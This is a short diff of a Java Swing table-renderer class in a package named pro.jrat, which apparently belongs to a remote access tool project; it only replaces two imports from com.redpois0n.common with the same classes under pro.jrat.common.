@@ -12,13 +12,13 @@ import javax.swing.table.DefaultTableCellRenderer;
 
 import pro.jrat.Main;
 import pro.jrat.Slave;
+import pro.jrat.common.OperatingSystem;
+import pro.jrat.common.Version;
 import pro.jrat.settings.Colors;
 import pro.jrat.ui.frames.Frame;
 import pro.jrat.utils.IconUtils;
 import pro.jrat.utils.Util;
 
-import com.redpois0n.common.OperatingSystem;
-import com.redpois0n.common.Version;
 
 @SuppressWarnings("serial")
 public class MainTableRenderer extends DefaultTableCellRenderer {
